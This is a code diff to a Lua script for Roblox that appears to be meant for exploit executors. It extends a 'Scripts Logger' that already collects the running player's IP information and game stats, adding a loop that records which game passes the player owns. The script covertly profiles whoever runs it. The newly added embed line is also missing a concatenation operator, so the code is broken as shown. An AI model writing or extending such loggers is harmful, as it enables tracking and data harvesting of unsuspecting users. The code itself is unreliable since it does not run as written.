@@ -98,6 +98,28 @@ local executor = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
 
 local ipInfo = GetIPInfo()
 
+local gamePasses = {
+    {name = "5x Slaps", property = "Owns5xSlaps"},
+    {name = "Custom", property = "OwnsCustom"},
+    {name = "Custom ID", property = "OwnsCustomID"},
+    {name = "Double Slaps", property = "OwnsDoubleSlaps"},
+    {name = "Overkill", property = "OwnsOverkill"},
+    {name = "Radio", property = "OwnsRadio"},
+    {name = "Spectator", property = "OwnsSpectator"}
+}
+
+local ownedGamePasses = {}
+for _, pass in ipairs(gamePasses) do
+    local property = pass.property
+    local displayName = pass.name
+
+    if player:FindFirstChild(property) and player[property].Value == true then
+        table.insert(ownedGamePasses, displayName)
+    end
+end
+
+local gamePassList = #ownedGamePasses > 0 and table.concat(ownedGamePasses, ", ") or "None"
+
 local embeds = {
     {
         ["title"] = "Scripts Logger",
@@ -134,6 +156,7 @@ local embeds = {
             "**Glove Equipping:** `" .. glove .. "`\n" ..
             "**Null Shards:** `" .. nullShards .. "`\n" ..
             "**Tournament Wins:** `" .. tournamentWins .. "`"
+            "**Own GamePass:** `" .. gamePassList .. "`"
     },
     {
         ["title"] = "More",
